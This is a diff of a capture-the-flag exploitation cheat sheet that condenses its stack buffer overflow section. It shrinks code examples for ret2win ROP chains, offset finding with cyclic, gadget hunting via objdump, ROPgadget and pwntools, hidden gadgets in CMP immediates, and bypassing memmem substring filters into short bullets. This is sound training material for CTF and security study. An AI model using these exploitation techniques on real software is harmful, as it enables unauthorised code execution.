@@ -4,72 +4,13 @@
 
 ## Stack Buffer Overflow
 
-1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
-2. Check protections: `checksec --file=binary`
-3. No PIE + No canary = direct ROP
-4. Canary leak via format string or partial overwrite
+`cyclic 200` then `cyclic -l <value>` gives the offset; `checksec` then routes to one of the branches in this file.
 
-### ret2win with Parameter (Magic Value Check)
+- **ret2win with a magic argument**: `p64(ret)` for 16-byte alignment, then `pop rdi; ret` + magic + `win`; the offset is `rbp - buffer + 8`.
+- **Hidden gadgets**: `cmp`/`mov`/`test` with large immediates encode usable bytes (`81 7d fc 5f 41 5e c3` is `pop rdi; pop r14; ret` at `+3`). `ROP(elf)` finds these; grep `objdump -d` only when the binary is tiny and pwntools comes up empty.
+- **Substring filters** (`memmem`, "badge"/"token" checks) are beaten by splitting the constant across the payload, not by avoiding it.
 
-**Pattern:** Win function checks argument against magic value before printing flag.
-
-```c
-// Common pattern in disassembly
-void win(long arg) {
-    if (arg == 0x1337c0decafebeef) {  // Magic check
-        // Open and print flag
-    }
-}
-```
-
-**Exploitation (x86-64):** `p64(ret)` (16-byte alignment) then
-`p64(pop_rdi) + p64(magic) + p64(win)`; the offset is `rbp - buffer` plus 8.
-
-**Finding the win function:**
-- Search for `fopen("flag.txt")` or similar in Ghidra
-- Look for functions with no XREF that check a magic parameter
-- Check for conditional print/exit patterns after parameter comparison
-
-### Input Filtering (memmem checks)
-
-Some challenges filter input using `memmem()` to block certain strings:
-```python
-payload = b"A" * 120 + p64(gadget) + p64(value)
-assert b"badge" not in payload and b"token" not in payload
-```
-
-### Finding Gadgets
-
-```bash
-# Find pop rdi; ret
-objdump -d binary | grep -B1 "pop.*rdi"
-ROPgadget --binary binary | grep "pop rdi"
-
-# Find simple ret (for alignment)
-objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
-```
-
-### Hidden Gadgets in CMP Immediates
-
-CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:
-
-```asm
-# Example: cmpl $0xc35e415f, -0x4(%rbp)
-# Bytes: 81 7d fc 5f 41 5e c3
-#                  ^^ ^^ ^^ ^^
-# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
-# At +4: 41 5e c3    = pop r14; ret
-# At +5: 5e c3       = pop rsi; ret
-```
-
-**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates -- their operand bytes may decode as useful gadgets.
-
-```python
-rop = ROP(elf)
-# pwntools finds these automatically
-for addr, gadget in rop.gadgets.items():
-    print(hex(addr), gadget)
-```
+---
 
 ## Struct Pointer Overwrite (Heap Menu Challenges)
 
